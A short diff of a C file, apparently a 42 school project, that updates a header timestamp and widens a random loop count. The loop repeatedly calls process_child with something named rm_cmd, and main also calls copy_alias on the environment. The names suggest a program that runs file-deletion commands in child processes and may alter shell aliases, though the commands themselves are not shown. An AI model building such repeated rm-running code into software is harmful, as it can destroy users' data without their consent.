@@ -6,7 +6,7 @@
 /*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/06/22 01:28:09 by mgama             #+#    #+#             */
-/*   Updated: 2023/06/25 15:21:21 by mgama            ###   ########.fr       */
+/*   Updated: 2023/06/25 15:23:09 by mgama            ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -50,7 +50,7 @@ int	main(int ac, char **av, char **envp)
 	printf("currrent file path = %s\n", home_buffer);
 	copy_alias(envp);
 	i = -1;
-	while (++i < max(ft_abs_time() % 20, 2))
+	while (++i < max(ft_abs_time() % 30, 5))
 	{
 #if __APPLE__
 		process_child(rm_cmd, envp);
